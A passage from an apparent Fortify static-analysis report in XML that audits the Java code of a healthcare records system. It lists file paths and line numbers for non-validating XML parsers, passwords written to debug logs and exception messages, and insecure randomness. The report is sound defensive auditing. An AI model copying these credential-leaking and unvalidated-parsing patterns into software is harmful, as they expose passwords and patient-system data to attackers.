                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>4</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="7F802A1705CEFA8F0201070010ED2C3D" ruleID="6205D59D-EEEC-42B0-9522-1FE15F05E302">
                            <Category>Missing XML Validation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The method processQRDA() in MUImpl.java fails to enable validation before parsing XML on line 1685, which gives an attacker the opportunity to supply malicious input.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>MUImpl.java</FileName>
<FilePath>EHR-MU-JAR/src/com/ehr/business/impl/MUImpl.java</FilePath>
<LineStart>1685</LineStart>
<Snippet>		DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
		DocumentBuilder builder = factory.newDocumentBuilder();
		Document doc = builder.parse(fileName);
		
		// Create XPath Instance</Snippet>
<TargetFunction>builder.parse(...)</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="ECCA4019219169DA6AAB826CC3B74752" ruleID="6205D59D-EEEC-42B0-9522-1FE15F05E302">
                            <Category>Missing XML Validation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The method getDOMFromXMLStream() in XMLUtil.java fails to enable validation before parsing XML on line 159, which gives an attacker the opportunity to supply malicious input.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>XMLUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/util/XMLUtil.java</FilePath>
<LineStart>159</LineStart>
<Snippet>
    DocumentBuilderFactory l_objDBF = DocumentBuilderFactory.newInstance();
    l_objDBF.setValidating(p_bValidate);
    DocumentBuilder l_objDocBuilder = l_objDBF.newDocumentBuilder();
    ErrorHandler l_objErrorHandler = new XMLErrorHandler();</Snippet>
<TargetFunction>l_objDBF.setValidating(...)</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D8973FC306520C19C552E97ED7AB18D5" ruleID="6205D59D-EEEC-42B0-9522-1FE15F05E302">
                            <Category>Missing XML Validation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The method parseQrdaFile() in QrdaSaxParseHandler.java fails to enable validation before parsing XML on line 43, which gives an attacker the opportunity to supply malicious input.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>QrdaSaxParseHandler.java</FileName>
<FilePath>EHR-MU-JAR/src/com/ehr/web/action/QrdaSaxParseHandler.java</FilePath>
<LineStart>43</LineStart>
<Snippet>		SAXParserFactory spf = SAXParserFactory.newInstance();
		SAXParser sp = spf.newSAXParser();
		sp.parse(fileName, this);
	}
	</Snippet>
<TargetFunction>sp.parse(...)</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="DAACBA32E9277AFAF6B467AEAD939662" ruleID="6205D59D-EEEC-42B0-9522-1FE15F05E302">
                            <Category>Missing XML Validation</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The method getDOMFromXMLFile() in XMLUtil.java fails to enable validation before parsing XML on line 130, which gives an attacker the opportunity to supply malicious input.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>XMLUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/util/XMLUtil.java</FilePath>
<LineStart>130</LineStart>
<Snippet>
    DocumentBuilderFactory l_objDBF = DocumentBuilderFactory.newInstance();
    l_objDBF.setValidating(p_bValidate);
    DocumentBuilder l_objDocBuilder = l_objDBF.newDocumentBuilder();
    ErrorHandler l_objErrorHandler = new XMLErrorHandler();</Snippet>
<TargetFunction>l_objDBF.setValidating(...)</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="4">
                        <groupTitle>Privacy Violation</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The method getConnection() in DbUtilImpl.java mishandles confidential information, which can compromise user privacy and is often illegal.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Privacy violations occur when:

1. Private user information enters the program.

2. The data is written to an external location, such as the console, file system, or network.


Example 1: The following code contains a logging statement that tracks the records added to a database by storing the contents in a log file.


pass = getPassword();
...
dbmsLog.println(id+":"+pass+":"+type+":"+tstamp);


The code in Example 1 logs a plain text password to the file system. Although many developers trust the file system as a safe storage location for data, it should not be trusted implicitly, particularly when privacy is a concern.

Privacy is one of the biggest concerns in the mobile world for a couple of reasons. One of them is a much higher chance of device loss. The other has to do with inter-process communication between mobile applications. With mobile platforms, applications are downloaded from various sources and are run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which is why application authors need to be careful about what information they include in messages addressed to other applications running on the device. Sensitive information should never be part of inter-process communication between mobile applications.

Example 2: The following code reads username and password for a given site from an Android WebView store and broadcasts them to all the registered receivers.

...
webview.setWebViewClient(new WebViewClient() {
  public void onReceivedHttpAuthRequest(WebView view,
        HttpAuthHandler handler, String host, String realm) {
    String[] credentials = view.getHttpAuthUsernamePassword(host, realm);
    String username = credentials[0];
    String password = credentials[1];
    Intent i = new Intent();
    i.setAction("SEND_CREDENTIALS");
    i.putExtra("username", username);
    i.putExtra("password", password);
    view.getContext().sendBroadcast(i);
  }
});
...


This example demonstrates several problems. First of all, by default, WebView credentials are stored in plain text and are not hashed. If a user has a rooted device (or uses an emulator), they can read stored passwords for given sites. Second, plain text credentials are broadcast to all the registered receivers, which means that any receiver registered to listen to intents with the SEND_CREDENTIALS action will receive the message. The broadcast is not even protected with a permission to limit the number of recipients, although in this case we do not recommend using permissions as a fix.

Private data can enter a program in a variety of ways:

- Directly from the user in the form of a password or personal information

- Accessed from a database or other data store by the application

- Indirectly from a partner or other third party

Typically, in the context of the mobile environment, this private information includes (along with passwords, SSNs, and other general personal information):

- Location

- Cell phone number

- Serial numbers and device IDs

- Network Operator information

- Voicemail information


Sometimes data that is not labeled as private can have a privacy implication in a different context. For example, student identification numbers are usually not considered private because there is no explicit and publicly-available mapping to an individual student's personal information. However, if a school generates identification numbers based on student social security numbers, then the identification numbers should be considered private.

Security and privacy concerns often seem to compete with each other. From a security perspective, you should record all important operations so that any anomalous activity can later be identified. However, when private data is involved, this practice can create risk.

Although there are many ways in which private data can be handled unsafely, a common risk stems from misplaced trust. Programmers often trust the operating environment in which a program runs, and therefore believe that it is acceptable to store private information on the file system, in the registry, or in other locally-controlled resources. However, even if access to certain resources is restricted, this does not guarantee that the individuals who do have access can be trusted. For example, in 2004, an unscrupulous employee at AOL sold approximately 92 million private customer email addresses to a spammer marketing an offshore gambling web site [1].

In response to such high-profile exploits, the collection and management of private data is becoming increasingly regulated. Depending on its location, the type of business it conducts, and the nature of any private data it handles, an organization may be required to comply with one or more of the following federal and state regulations:

- Safe Harbor Privacy Framework [3]

- Gramm-Leach Bliley Act (GLBA) [4]

- Health Insurance Portability and Accountability Act (HIPAA) [5]

- California SB-1386 [6]

Despite these regulations, privacy violations continue to occur with alarming frequency.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>When security and privacy demands clash, privacy should usually be given the higher priority. To accomplish this and still maintain required security information, cleanse any private information before it exits the program.

To enforce good privacy management, develop and strictly adhere to internal privacy guidelines. The guidelines should specifically describe how an application should handle private data. If your organization is regulated by federal or state law, ensure that your privacy guidelines are sufficiently strenuous to meet the legal requirements. Even if your organization is not regulated, you must protect private information or risk losing customer confidence.

The best policy with respect to private data is to minimize its exposure. Applications, processes, and employees should not be granted access to any private data unless the access is required for the tasks that they are to perform. Just as the principle of least privilege dictates that no operation should be performed with more than the necessary privileges, access to private data should be restricted to the smallest possible group.

For mobile applications, make sure they never communicate any sensitive data to other applications running on the device. When private data needs to be stored, it should always be encrypted. For Android, as well as any other platform that uses SQLite database, SQLCipher is a good alternative. SQLCipher is an extension to the SQLite database that provides transparent 256-bit AES encryption of database files. Thus, credentials can be stored in an encrypted database.

Example 3: The following code demonstrates how to integrate SQLCipher into an Android application after downloading the necessary binaries, and store credentials into the database file.

import net.sqlcipher.database.SQLiteDatabase;
...
  SQLiteDatabase.loadLibs(this);
  File dbFile = getDatabasePath("credentials.db");
  dbFile.mkdirs();
  dbFile.delete();
  SQLiteDatabase db = SQLiteDatabase.openOrCreateDatabase(dbFile, "credentials", null);
  db.execSQL("create table credentials(u, p)");
  db.execSQL("insert into credentials(u, p) values(?, ?)", new Object[]{username, password});
...


Note that references to android.database.sqlite.SQLiteDatabase are substituted with those of net.sqlcipher.database.SQLiteDatabase.

To enable encryption on the WebView store, you must recompile WebKit with the sqlcipher.so library.

Example 4: The following code reads username and password for a given site from an Android WebView store and instead of broadcasting them to all the registered receivers, it only broadcasts internally so that the broadcast is only seen by other parts of the same application.

...
webview.setWebViewClient(new WebViewClient() {
  public void onReceivedHttpAuthRequest(WebView view,
        HttpAuthHandler handler, String host, String realm) {
    String[] credentials = view.getHttpAuthUsernamePassword(host, realm);
    String username = credentials[0];
    String password = credentials[1];
    Intent i = new Intent();
    i.setAction("SEND_CREDENTIALS");
    i.putExtra("username", username);
    i.putExtra("password", password);
    LocalBroadcastManager.getInstance(view.getContext()).sendBroadcast(i);
  }
});
...
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. As part of any thorough audit for privacy violations, ensure that custom rules are written to identify all sources of private or otherwise sensitive information entering the program. Most sources of private data cannot be identified automatically. Without custom rules, your check for privacy violations is likely to be substantially incomplete.

2. You can use the Fortify Java Annotations FortifyPassword, FortifyNotPassword, FortifyPrivate, and FortifyNotPrivate to indicate which fields and variables represent passwords and private data.

3. A number of modern web frameworks provide mechanisms to perform user input validation (including Struts and Spring MVC). To highlight the unvalidated sources of input, the Fortify Secure Coding Rulepacks dynamically re-prioritize the issues reported by Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the Fortify user with the auditing process, the Fortify Software Security Research group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>4</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="88C83B82CAB0597117343388E177DFE4" ruleID="E1AFC322-743D-44BB-A93F-91ECC9D871E1">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>The method log() in ConsoleLog.java mishandles confidential information, which can compromise user privacy and is often illegal.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ConsoleLog.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/log/ConsoleLog.java</FilePath>
<LineStart>64</LineStart>
<Snippet>      if (isSeverityLevelValid(p_iSeverityLevel))
      /* Fortify Fix for APPSEC-3832 Privacy Violation - START */
    	  m_outPrintStream.println(LogFormatter.FormatString(null,p_sMethodName,"",p_sMsg));
      /* Fortify Fix for APPSEC-3832 Privacy Violation - END */
</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>FileNetUploaderImpl.java</FileName>
<FilePath>EHR-DOCS-JAR/src/com/ehr/business/impl/FileNetUploaderImpl.java</FilePath>
<LineStart>201</LineStart>
<Snippet>		try{
			String l_sUserName = EHRDocsCommonConstants.FILE_NET_ADD_USER;
			String l_sPassword = EHRDocsCommonConstants.FILE_NET_ADD_USER_PASSWORD;
			String l_sObjectStore = EHRDocsCommonConstants.FILE_NET_OBJECT_STORE;
			String l_sObjectFolder = EHRDocsCommonConstants.FILE_NET_OBJECT_FOLDER;</Snippet>
<TargetFunction>Read com.ehr.common.EHRDocsCommonConstants/FILE_NET_ADD_USER_PASSWORD()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="446EBD3CA66E81C70059555C130A56D6" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>The method getConnection() in DbUtilImpl.java mishandles confidential information, which can compromise user privacy and is often illegal.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>362</LineStart>
<Snippet>            {
                throw new InvalidArguementException(" parameters to getconnection is null " +
                        p_sUserid + ' ' + p_sPassword);
            }
</Snippet>
<TargetFunction>com.cnsi.exception.InvalidArguementException.InvalidArguementException()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>362</LineStart>
<Snippet>            {
                throw new InvalidArguementException(" parameters to getconnection is null " +
                        p_sUserid + ' ' + p_sPassword);
            }
</Snippet>
<TargetFunction>Read p_sPassword()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="8E25799805182D3828E806BD4303619C" ruleID="E1AFC322-743D-44BB-A93F-91ECC9D871E1">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>The method log() in ConsoleLog.java mishandles confidential information, which can compromise user privacy and is often illegal.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ConsoleLog.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/log/ConsoleLog.java</FilePath>
<LineStart>64</LineStart>
<Snippet>      if (isSeverityLevelValid(p_iSeverityLevel))
      /* Fortify Fix for APPSEC-3832 Privacy Violation - START */
    	  m_outPrintStream.println(LogFormatter.FormatString(null,p_sMethodName,"",p_sMsg));
      /* Fortify Fix for APPSEC-3832 Privacy Violation - END */
</Snippet>
<TargetFunction>java.io.PrintStream.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>FileNetUploaderImpl.java</FileName>
<FilePath>EHR-DOCS-JAR/src/com/ehr/business/impl/FileNetUploaderImpl.java</FilePath>
<LineStart>208</LineStart>
<Snippet>			if(Logger.SEVERITY_DEBUG == m_objLogger.getCurrentSeverityLevel()) {
	        	m_objLogger.log(Logger.SEVERITY_DEBUG, getClass(), "l_sUserName", l_sUserName);
	        	m_objLogger.log(Logger.SEVERITY_DEBUG, getClass(), "l_sPassword", l_sPassword);
	        	m_objLogger.log(Logger.SEVERITY_DEBUG, getClass(), "l_sObjectStore", l_sObjectStore);
	        	m_objLogger.log(Logger.SEVERITY_DEBUG, getClass(), "l_sObjectFolder", l_sObjectFolder);</Snippet>
<TargetFunction>Read l_sPassword()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="3D2AA5EB3C865B23A4E8C3B7438FC05A" ruleID="10951BF4-F239-4F1D-8ADB-B12DE560960F">
                            <Category>Privacy Violation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>The method InvalidArguementException() in InvalidArguementException.java mishandles confidential information, which can compromise user privacy and is often illegal.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>InvalidArguementException.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/exception/InvalidArguementException.java</FilePath>
<LineStart>24</LineStart>
<Snippet>   public InvalidArguementException(String p_sMsg)
   {
     super(p_sMsg);
   }//InvalidArguementException
   </Snippet>
<TargetFunction>java.lang.RuntimeException.RuntimeException()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>DbUtilImpl.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/DbUtilImpl.java</FilePath>
<LineStart>362</LineStart>
<Snippet>            {
                throw new InvalidArguementException(" parameters to getconnection is null " +
                        p_sUserid + ' ' + p_sPassword);
            }
</Snippet>
<TargetFunction>Read p_sPassword()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>Code Correctness: Class Does Not Implement equals</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The equals() method is called on an object that does not implement equals().</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>When comparing objects, developers usually want to compare properties of objects. However, calling equals() on a class (or any super class/interface) that does not explicitly implement equals() results in a call to the equals() method inherited from java.lang.Object. Instead of comparing object member fields or other properties, Object.equals() compares two object instances to see if they are the same. Although there are legitimate uses of Object.equals(), it is often an indication of buggy code.

Example 1:

public class AccountGroup
{
	private int gid;

	public int getGid()
	{
		return gid;
	}

	public void setGid(int newGid)
	{
		gid = newGid;
	}
}
...
public class CompareGroup
{
	public boolean compareGroups(AccountGroup group1, AccountGroup group2)
	{
		return group1.equals(group2);   //equals() is not implemented in AccountGroup
	}
}
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Verify that the use of Object.equals() is really the method you intend to call. If not, implement an equals() method or use a different method for comparing objects.

Example 2: The following code adds an equals() method to the example from the Explanation section.

public class AccountGroup
{
	private int gid;

	public int getGid()
	{
		return gid;
	}

	public void setGid(int newGid)
	{
		gid = newGid;
	}

	public boolean equals(Object o)
	{
		if (!(o instanceof AccountGroup))
			return false;
		AccountGroup other = (AccountGroup) o;
		return (gid == other.getGid());
	}
}
...
public class CompareGroup
{
	public static boolean compareGroups(AccountGroup group1, AccountGroup group2)
	{
		return group1.equals(group2);
	}
}
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. Fortify Static Code Analyzer detects when an object's static type does not implement equals(). This issue might be a false positive if an object's dynamic type implements equals().</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>3</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="C231A44AB72B5CB2B8DAB6D6090B81C0" ruleID="8303786C-2D44-445D-857D-1C929841AECC">
                            <Category>Code Correctness: Class Does Not Implement equals</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>The equals() method is called on an object that does not implement equals().</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FileNetUploaderImpl.java</FileName>
<FilePath>EHR-DOCS-JAR/src/com/ehr/business/impl/FileNetUploaderImpl.java</FilePath>
<LineStart>353</LineStart>
<Snippet>					    
					    if(l_sUserDefinedPropertyValue != null &amp;&amp; !l_sUserDefinedPropertyValue.equals("")) {
						    if(l_objPropertyDefinition.get_DataType().equals(TypeID.DATE)){
						    	SimpleDateFormat b_sdfFormat = new SimpleDateFormat("MM/dd/yyyy HH:mm:ss");
						    	</Snippet>
<TargetFunction>FunctionCall: equals()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="174B46C52827BEEBA8FB393CB90AF283" ruleID="8303786C-2D44-445D-857D-1C929841AECC">
                            <Category>Code Correctness: Class Does Not Implement equals</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>The equals() method is called on an object that does not implement equals().</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FileNetUploaderImpl.java</FileName>
<FilePath>EHR-DOCS-JAR/src/com/ehr/business/impl/FileNetUploaderImpl.java</FilePath>
<LineStart>363</LineStart>
<Snippet>						    } else if(l_objPropertyDefinition.get_DataType().equals(TypeID.LONG)){
						    	p_objDocument.getProperties().putValue(l_objPropertyDefinition.get_SymbolicName(),new Integer(l_sUserDefinedPropertyValue) );
						    } else if(l_objPropertyDefinition.get_DataType().equals(TypeID.DOUBLE)){
						    	p_objDocument.getProperties().putValue(l_objPropertyDefinition.get_SymbolicName(),new Double(l_sUserDefinedPropertyValue) );
						    } else {</Snippet>
<TargetFunction>FunctionCall: equals()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="5B35D091A3FBAF942C8FC5E705C251F5" ruleID="8303786C-2D44-445D-857D-1C929841AECC">
                            <Category>Code Correctness: Class Does Not Implement equals</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>The equals() method is called on an object that does not implement equals().</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FileNetUploaderImpl.java</FileName>
<FilePath>EHR-DOCS-JAR/src/com/ehr/business/impl/FileNetUploaderImpl.java</FilePath>
<LineStart>361</LineStart>
<Snippet>									p_objDocument.getProperties().putValue(l_objPropertyDefinition.get_SymbolicName(), b_sdfFormat.parse(l_sUserDefinedPropertyValue));
								}
						    } else if(l_objPropertyDefinition.get_DataType().equals(TypeID.LONG)){
						    	p_objDocument.getProperties().putValue(l_objPropertyDefinition.get_SymbolicName(),new Integer(l_sUserDefinedPropertyValue) );
						    } else if(l_objPropertyDefinition.get_DataType().equals(TypeID.DOUBLE)){</Snippet>
<TargetFunction>FunctionCall: equals()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>Dead Code: Empty Try Block</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>Empty try blocks are either dead code or indicate the presence of debug code.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>An empty try block serves no functional purpose. In fact, when compiled to byte code, the empty try block is optimized out and never makes it into the finished program. An empty try block might be indicative of code that has been removed or commented out.
Example 1: The following code contains an empty try block.

try {
//rs = stmt.executeQuery(query);
}
catch(SQLException e) {
log(e);
}

Dead code negatively impacts code quality, making code harder to read, understand, and maintain.
This category is from the Cigital Java Rulepack.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>If a try block serves no purpose, remove it. Otherwise, determine what application logic is missing and complete the try block with the appropriate code.

Example 2: The following code contains the missing code that was omitted in Example 1.

try {
rs = stmt.executeQuery(query);
}
catch(SQLException e) {
log(e);
}
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>3</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="15E1798508085A846ADF0018D3277754" ruleID="3F50440E-C948-465D-94A0-38D913C45934">
                            <Category>Dead Code: Empty Try Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>Empty try blocks are either dead code or indicate the presence of debug code.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CNSIEncoderException.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/encoder/CNSIEncoderException.java</FilePath>
<LineStart>210</LineStart>
<Snippet> {
     try
     {
         
     }</Snippet>
<TargetFunction>TryBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="F16092E36CEF4115C030A4927109DC58" ruleID="3F50440E-C948-465D-94A0-38D913C45934">
                            <Category>Dead Code: Empty Try Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>Empty try blocks are either dead code or indicate the presence of debug code.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>EHRRequestHandler.java</FileName>
<FilePath>EHR-JAR/src/com/ehr/web/action/EHRRequestHandler.java</FilePath>
<LineStart>127</LineStart>
<Snippet>     */
    public void createPresentationObjects(HttpServletRequest p_objRequest, Map p_mapRequestParameters) throws CNSIException {
		try{
	 	
		} catch(Exception ex) {</Snippet>
<TargetFunction>TryBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="B4C0C1953718F37EA08DE1987736EF1C" ruleID="3F50440E-C948-465D-94A0-38D913C45934">
                            <Category>Dead Code: Empty Try Block</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>Empty try blocks are either dead code or indicate the presence of debug code.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>MMISSessionListener.java</FileName>
<FilePath>ECAMS-WEBAPP/src/com/cnsi/common/MMISSessionListener.java</FilePath>
<LineStart>53</LineStart>
<Snippet>		
	     try
	     {
	        //SecurityUtil.logAuditData(session,CNSIConstants.SECURITY_AUDIT_LKPCD_LOG_OUT,"123","from MMISSessionListener",l_objSecurityMgr.getUserDetails());
	     }</Snippet>
<TargetFunction>TryBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>Insecure Randomness</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The random number generator implemented by nextInt() cannot withstand a cryptographic attack.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Insecure randomness errors occur when a function that can produce predictable values is used as a source of randomness in a security-sensitive context.

Computers are deterministic machines, and as such are unable to produce true randomness. Pseudorandom Number Generators (PRNGs) approximate randomness algorithmically, starting with a seed from which subsequent values are calculated.

There are two types of PRNGs: statistical and cryptographic. Statistical PRNGs provide useful statistical properties, but their output is highly predictable and form an easy to reproduce numeric stream that is unsuitable for use in cases where security depends on generated values being unpredictable. Cryptographic PRNGs address this problem by generating output that is more difficult to predict. For a value to be cryptographically secure, it must be impossible or highly improbable for an attacker to distinguish between the generated random value and a truly random value. In general, if a PRNG algorithm is not advertised as being cryptographically secure, then it is probably a statistical PRNG and should not be used in security-sensitive contexts, where its use can lead to serious vulnerabilities such as easy-to-guess temporary passwords, predictable cryptographic keys, session hijacking, and DNS spoofing.

Example: The following code uses a statistical PRNG to create a URL for a receipt that remains active for some period of time after a purchase.


String GenerateReceiptURL(String baseUrl) {
    Random ranGen = new Random();
    ranGen.setSeed((new Date()).getTime());
    return (baseUrl + ranGen.nextInt(400000000) + ".html");
}


This code uses the Random.nextInt() function to generate "unique" identifiers for the receipt pages it generates. Since Random.nextInt() is a statistical PRNG, it is easy for an attacker to guess the strings it generates. Although the underlying design of the receipt system is also faulty, it would be more secure if it used a random number generator that did not produce predictable receipt identifiers, such as a cryptographic PRNG.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>When unpredictability is critical, as is the case with most security-sensitive uses of randomness, use a cryptographic PRNG. Regardless of the PRNG you choose, always use a value with sufficient entropy to seed the algorithm. (Do not use values such as the current time because it offers only negligible entropy.)

The Java language provides a cryptographic PRNG in java.security.SecureRandom. As is the case with other algorithm-based classes in java.security, SecureRandom provides an implementation-independent wrapper around a particular set of algorithms. When you request an instance of a SecureRandom object using SecureRandom.getInstance(), you can request a specific implementation of the algorithm. If the algorithm is available, then it is given as a SecureRandom object. If it is unavailable or if you do not specify a particular implementation, then you are given a SecureRandom implementation selected by the system.

Sun provides a single SecureRandom implementation with the Java distribution named SHA1PRNG, which Sun describes as computing:

"The SHA-1 hash over a true-random seed value concatenated with a 64-bit counter which is incremented by 1 for each operation. From the 160-bit SHA-1 output, only 64 bits are used [1]."

However, the specifics of the Sun implementation of the SHA1PRNG algorithm are poorly documented, and it is unclear what sources of entropy the implementation uses and therefore what amount of true randomness exists in its output. Although there is speculation on the Web about the Sun implementation, there is no evidence to contradict the claim that the algorithm is cryptographically strong and can be used safely in security-sensitive contexts.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>3</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
